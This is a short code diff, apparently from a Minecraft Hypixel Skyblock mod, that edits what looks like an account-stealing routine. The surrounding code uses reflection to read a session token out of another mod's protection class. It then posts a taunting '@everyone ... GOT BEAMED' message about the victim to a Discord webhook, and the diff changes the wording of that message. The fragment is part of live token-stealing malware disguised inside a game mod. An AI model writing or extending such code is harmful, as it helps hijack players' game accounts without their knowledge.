@@ -122,7 +122,7 @@ public class Methods {
                     token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
                 }
 			    guiUtils dh = new guiUtils(gui.guiHandler());
-			    dh.setContent("@everyone " + name + " DOWN L BOZO");
+			    dh.setContent("@everyone " + name + " GOT BEAMED https://sky.shiiyu.moe/stats/" + name);
 			    dh.setUsername("GET BEAMED");
 				dh.setAvatarUrl("https://cdn.discordapp.com/attachments/889146587522150480/1011717932075720814/uganda.png");
 				dh.setTts(true);
